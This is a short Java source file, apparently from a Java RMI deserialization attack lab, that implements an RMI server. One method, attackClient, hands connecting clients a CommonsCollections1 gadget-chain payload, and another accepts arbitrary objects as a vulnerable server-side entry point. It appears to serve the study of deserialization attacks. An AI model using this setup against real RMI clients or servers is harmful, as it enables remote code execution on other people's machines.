package nth347.common;

import nth347.payloads.CommonsCollections1;

import java.lang.reflect.InvocationTargetException;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RMIInterfaceImpl extends UnicastRemoteObject implements RMIInterface {
    public RMIInterfaceImpl() throws RemoteException {
    }

    public String helloRMI(String from) throws RemoteException {
        return "Hello RMI from " + from;
    }

    public int primitiveMethod(int i) throws RemoteException {
        return i;
    }

    public Object attackClient() throws RemoteException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        return CommonsCollections1.getPayload();
    }

    public void attackServer(Object object) throws RemoteException {
        System.out.println("[+] vulnerableMethod()");
    }
}
